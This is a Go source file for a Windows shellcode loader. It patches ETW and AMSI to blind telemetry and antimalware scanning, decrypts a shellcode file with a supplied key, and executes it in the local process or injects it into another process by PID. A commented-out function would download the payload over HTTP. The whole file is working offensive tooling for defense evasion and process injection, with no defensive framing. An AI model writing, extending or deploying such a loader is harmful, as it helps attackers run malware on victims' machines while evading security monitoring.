//go:build windows

package main

import (
	"flag"
	"log"
	"os"

	"github.com/mszatanik/goloader/internal/bypass"
	"github.com/mszatanik/goloader/internal/loaders"
	"github.com/mszatanik/goloader/pkg/crypter"
)

func main() {
	task := flag.String("t", "", "what to do ?")
	what := flag.String("w", "", "what to load ?")
	key := flag.String("k", "", "a 32 char long key used to decrypt the file")
	pid := flag.Uint("p", 0, "pid of a process to inject into")
	etw := flag.Bool("etw", false, "bypass ETW")
	amsi := flag.Bool("amsi", false, "bypass AMSI")

	flag.Parse()

	// validate required args
	if *what == "" || *task == "" {
		flag.PrintDefaults()
		log.Fatalln("[-] not all required args passed")
	}

	if *etw {
		log.Println("[*] patching ETW")
		bypass.Patch_NtTraceEvent2()
	}

	if *amsi {
		log.Println("[*] patching AMSI")
		bypass.Patch_AmsiScanBuffer()
	}

	// read shellcode to var
	sc := getShellcodeFromFile(*what, *key)

	// execute
	switch *task {
	case "local_process_execution":
		log.Println("[*] local_process_execution")
		loaders.ExecuteShellcodeInLocalProcess(sc)
	case "remote_process_execution":
		log.Println("[*] remote_process_execution")
		loaders.ExecuteShellcodeInRemoteProcess(sc, uint32(*pid))
	case "DLL_injection":
		log.Println("[*] DLL_injection")
	}
}

func getShellcodeFromFile(path string, key string) []byte {
	retval, err := os.ReadFile(path)
	if err != nil {
		log.Fatalf("[-] Error opening file at %s: %s\r\n", path, err)
	}

	if key != "" {
		retval = crypter.Decrypt([]byte(key), retval)
	}

	return retval
}

// func get(url string) []byte {
// 	fmt.Printf("[*] Getting file from %s\r\n", url)
// 	resp, err := http.Get(url)
// 	if err != nil {
// 		panic(err)
// 	}
// 	defer resp.Body.Close()

// 	bodyBytes, err := io.ReadAll(resp.Body)
// 	if err != nil {
// 		panic(err)
// 	}
// 	fmt.Printf("[+] Got file, len=%d\r\n", len(bodyBytes))
// 	return bodyBytes
// }
